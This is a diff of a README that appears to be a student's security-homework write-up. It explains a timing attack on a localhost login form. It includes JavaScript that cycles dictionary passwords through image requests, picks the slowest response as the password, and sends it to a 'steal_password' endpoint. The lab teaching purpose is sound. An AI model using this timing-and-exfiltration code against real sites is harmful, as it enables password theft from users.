@@ -97,5 +97,55 @@ here are the links I used for this question:
 ``` url https://www.w3schools.com/tags/att_form_target.asp```
 ```url https://stackoverflow.com/questions/37146241/promise-not-working-properly```
 
-# 3. Gamma Exploit:
+# 3. Gamma Exploit: Timing Attack
+
+In this part of the Homework, a timming attack is going to be performed. In this Scenario, Since the computation time of the server for the correct and incorrect passwords are not the same, the attacker can figure out which password is the correct one. 
+In the given file of the question, there is a dictionary of the possible passwords containing the correct password.
+In the following steps, I'm going to explain the completed version of the template provided under the name `Gamma_Starter.html` named as g.txt:
+``` javascript
+var dictionary = [`password`, `123456`, `12345678`, `dragon`, `1234`, `qwerty`, `12345`];
+      var index = 0;
+      var timings = [];
+      var test = document.getElementById("test");
+```
+The `timings` array has been added to store the time each password candidate takes.
+
+```javascript
+test.onerror = function () {
+        var end = new Date();
+        var timeTaken = end - start;
+
+        console.log(`Attempt ${index}: Password: "${dictionary[index - 1]}", Time elapsed: ${timeTaken} ms`);
+        timings.push({ index: index - 1, time: timeTaken });
+
+        start = new Date();
+
+        if (index < dictionary.length) {
+          console.log(`Testing password: "${dictionary[index]}"...`);
+          test.src = `http://localhost:3000/get_login?username=userx&password=${dictionary[index]}`;
+        } else {
+          var maxTimeEntry = timings.reduce((max, current) =>
+            current.time > max.time ? current : max
+          );
+          var guessedPassword = dictionary[maxTimeEntry.index];
+          console.log(
+            `Guessed Password: "${guessedPassword}", Max Time: ${maxTimeEntry.time} ms`
+          );
+          var theftUrl = `http://localhost:3000/steal_password?password=${guessedPassword}&timeElapsed=${maxTimeEntry.time}`;
+          console.log(`Sending theft request with password "${guessedPassword}"...`);
+          var theftImage = new Image();
+          theftImage.src = theftUrl;
+        }
+        index += 1;
+      };
+```
+In the function, `timeTaking` has been added to calculate the exact time that a password takes time to be checked. 
+Later, I placed a log in the code that each try for a password be logged and I would be able to check it in the logs of my docker container.
+![image](https://github.com/user-attachments/assets/7e7924b0-aec8-4d97-b88a-b0fedcf41a0e)
+After the logs, each timing is stored in the `timing` array.
+As long as we have not reached the end of the array, each password is tested in the `test.src` url. After that the `maxTimeEntry` variable, stores the max time that a password has taken to be checked by being checked in the `else` with the current time.
+In the next step, there is the `guessedPassword` variable holding the element in the dictionary via finding it by the index of `maxTimeEntry` and then it logs it.(The correct password can be seen in the image above.)
+The last part of the code sends a request to a server with the guessed password and its response time by dynamically creating a URL (`theftUrl`). An `Image` object (`theftImage`) is used to initiate the request by setting its `src` property to the URL. This triggers an HTTP GET request, and a log indicates the request is being sent with the guessed password. 
+
+
 
